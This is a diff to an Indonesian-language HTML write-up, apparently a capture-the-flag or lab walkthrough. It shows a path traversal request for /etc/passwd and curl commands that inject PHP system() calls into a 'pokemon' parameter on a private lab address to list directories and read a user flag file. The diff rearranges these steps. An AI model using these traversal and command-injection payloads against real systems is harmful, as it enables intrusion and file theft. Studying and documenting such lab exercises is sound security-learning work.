@@ -490,18 +490,15 @@ GET /?pokemon=../../../../etc/passwd
   </li>
 
   <li> 
-    <p><strong>Remode Code Execution:</strong> Kita dapat memasukan kode seperti ini dan hasilnya seperti ini.</p>
+    <p><strong>Code Execution:</strong> Kita dapat memasukan kode seperti ini dan hasilnya seperti ini.</p>
 
     <img width="1541" height="741" alt="image" src="https://github.com/user-attachments/assets/ba804dda-10d9-44ac-a587-9757f8e41dc8" />
 <p>Lalu, kita dapat memasukkan command lain selain id, misalnya seperti ini.</p>
 
 <pre>
 curl -s "http://10.15.42.23:5001/?pokemon='.system('ls+-la').'"
-  
+curl -s "http://10.15.42.23:5001/?pokemon='.system('ls+-la+/').'"
 curl -s "http://10.15.42.23:5001/?pokemon='.system('ls+-la+/home/user/').'"
-  
-curl -s "http://10.15.42.23:5001/?pokemon='.system('cat+/home/user/user_Vi4Wgk6yhFXuymQJqNJ3xVwMcDJzzzDeA03jx58Z.txt').'"
-
 </pre>
 <img width="766" height="292" alt="image" src="https://github.com/user-attachments/assets/a88a90bf-8f32-49d2-a790-4dd5f70c3568" />
 
@@ -510,7 +507,10 @@ curl -s "http://10.15.42.23:5001/?pokemon='.system('cat+/home/user/user_Vi4Wgk6y
 <img width="880" height="337" alt="image" src="https://github.com/user-attachments/assets/c6de6536-9d15-4c11-b58d-8446b9d04e64" />
 </li>
     <li>
-    <p><strong>Remode Code Execution:</strong> Kita dapat memasukan kode seperti ini dan hasilnya seperti ini.</p>
+    <p><strong>Remode Code Execution:</strong> Setelah menemukan file unik, langkah selanutnya hanya membuka file tersebut.</p>
+    <pre>
+      curl -s "http://10.15.42.23:5001/?pokemon='.system('cat+/home/user/user_Vi4Wgk6yhFXuymQJqNJ3xVwMcDJzzzDeA03jx58Z.txt').'"
+    </pre>
       
 <img width="946" height="202" alt="image" src="https://github.com/user-attachments/assets/190fdf1d-2803-40a9-909f-4e2c2bf8b251" />
 
